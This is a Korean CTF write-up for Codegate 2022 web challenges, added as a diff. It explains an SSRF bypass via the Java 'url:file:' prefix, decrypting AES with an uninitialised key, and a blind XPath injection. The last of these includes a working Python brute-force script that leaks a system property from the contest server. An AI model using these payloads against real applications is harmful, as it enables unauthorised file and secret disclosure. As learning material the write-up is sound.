@@ -1,0 +1,128 @@
+---
+title: "Codegate 2022 Web & Blockchain Writeup"
+description: "Baby First(SSRF), Superbee(AES), MyBlog(XPath Injection), NFT 문제 풀이"
+date: 2022-02-27
+published: true
+ctf: "Codegate 2022"
+category: "web"
+difficulty: "medium"
+tags: ["ssrf", "aes", "xpath-injection", "blockchain"]
+---
+
+## 개요
+
+본선 못 갔으니 대충 쓰겠다.. 웹을 너무 빨리 풀어서 블체만 봤는데 개인적으로 블체에 대해 너무 몰라서 많이 아쉬운 감이 있었다 흑흑..
+
+---
+
+## [Baby First] - SSRF
+
+> 요약: SSRF로 regex 검사를 우회하여 local file을 leak한다
+
+당연히 baby 붙어있길래 이거부터 봐서 그런지 **퍼스트 솔브**를 먹어버린 문제이다 ;;;
+
+### 취약점 분석
+
+```java
+pattern = Pattern.compile("^[a-z]+:");
+matcher = pattern.matcher(tmp);
+if (!matcher.find() || matcher.group().startsWith("file")) 
+    return "";
+```
+
+`java.net.URL`을 사용해서 넣어주는데, `startsWith` 함수로 `file:` 프로토콜 검사를 한다.
+
+### java.net.URL 분석
+
+[OpenJDK 소스](https://github.com/AdoptOpenJDK/openjdk-jdk11/blob/master/src/java.base/share/classes/java/net/URL.java#L575)를 보면 `url:` 로 시작하면 start를 += 4 해주는 것을 볼 수 있다.
+
+### Solution
+
+```
+memo=[url:file:///flag]
+```
+
+---
+
+## [Superbee] - AES Uninitialized Key
+
+> 요약: AES key가 초기화되지 않아 padding 값으로 복호화 가능
+
+솔직히 대회하면서 이 문제가 왜 100점까지 털렸지라는 의문이 있었는데... 알고보니 계정이 `admin/password` 였다고 한다. (언인텐)
+
+### 취약점 분석
+
+```go
+func (this *AdminController) AuthKey() {
+    encrypted_auth_key, _ := AesEncrypt([]byte(auth_key), []byte(auth_crypt_key))
+    this.Ctx.WriteString(hex.EncodeToString(encrypted_auth_key))
+}
+```
+
+`auth_crypt_key`가 선언만 되어있고 값을 불러오지 않는다!
+
+```go
+func AesEncrypt(origData, key []byte) ([]byte, error) {
+    padded_key := Padding(key, 16)  // key가 빈 값이면 \x10*16
+    block, err := aes.NewCipher(padded_key)
+    // ...
+    blockMode := cipher.NewCBCEncrypter(block, padded_key[:blockSize])
+    // IV도 padded_key에서 가져옴
+}
+```
+
+- Key: `\x10 * 16`
+- IV: `\x10 * 16`
+
+### Solution
+
+```python
+# 복호화 결과
+b'Th15_sup3r_s3cr3t_K3y_N3v3r_B3_L34k3d\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b'
+```
+
+---
+
+## [MyBlog] - Blind XPath Injection
+
+> 요약: blind xpath injection으로 catalina.properties에 설정된 environ variable leak
+
+### 취약점 발견 과정
+
+JSP 문제 나오면 일단 톰캣, JDK부터 오디팅하는 습관이 들어져버렸다.
+
+`catalina.properties`에 플래그 세팅해준 거 보니 `System.getProperty` 같은 함수가 xpath 사용할 때 내부적으로 쓸 거라 생각이 들었다.
+
+XPath function들 중에 `system-property`라는 좋은 함수가 있었다:
+
+1. [Keywords.java#L301](https://github.com/AdoptOpenJDK/openjdk-jdk11/blob/master/src/java.xml/share/classes/com/sun/org/apache/xpath/internal/compiler/Keywords.java#L301)
+2. [FunctionTable.java#L224](https://github.com/AdoptOpenJDK/openjdk-jdk11/blob/master/src/java.xml/share/classes/com/sun/org/apache/xpath/internal/compiler/FunctionTable.java#L224)
+3. [FuncSystemProperty.java#L101](https://github.com/AdoptOpenJDK/openjdk-jdk11/blob/master/src/java.xml/share/classes/com/sun/org/apache/xpath/internal/functions/FuncSystemProperty.java#L101)
+
+### Exploit
+
+```python
+from arang import *
+
+s = requests.session()
+headers = {"Cookie": "JSESSIONID=C37A435A55859F879AC71B4ECE966C07"}
+
+flag = "codegate2022{"
+
+for i in range(len(flag)+1, 47):
+    for c in "0123456789abcdef}":
+        url = f"http://3.39.79.180/blog/read?idx=' or @idx=string-length(substring(system-property('flag'),{i},1)='{c}'='true')-4 and @idx='1"
+        r = s.get(url)
+        if 'asdf' not in r.content.decode():
+            flag += c
+            print(f"[{len(flag)}/46] flag - {flag}")
+            break
+```
+
+---
+
+## 배운 점
+
+- Java URL 파서의 특이한 동작 (`url:` prefix)
+- Go에서 초기화되지 않은 변수의 위험성
+- XPath의 `system-property` 함수로 시스템 속성 접근 가능
